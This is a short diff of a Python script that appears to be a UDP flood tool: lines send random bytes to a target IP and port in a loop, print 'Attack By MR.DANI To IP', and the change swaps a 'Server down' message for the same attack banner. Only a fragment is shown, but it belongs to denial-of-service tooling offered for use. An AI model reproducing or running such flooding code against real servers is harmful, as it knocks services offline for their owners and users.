@@ -37,7 +37,7 @@ def run():
 				s.sendto(data,addr)
 			print(i +" \033[92mAttack By MR.DANI To IP %s|%s"%(orgip,port))
 		except:
-			print("[!] \033[92mServer down!!!")
+			print("[*] \033[92mAttack By MR.DANI To IP %s|%s"%(orgip,port))
 
 def run2():
 	data = random._urandom(16)
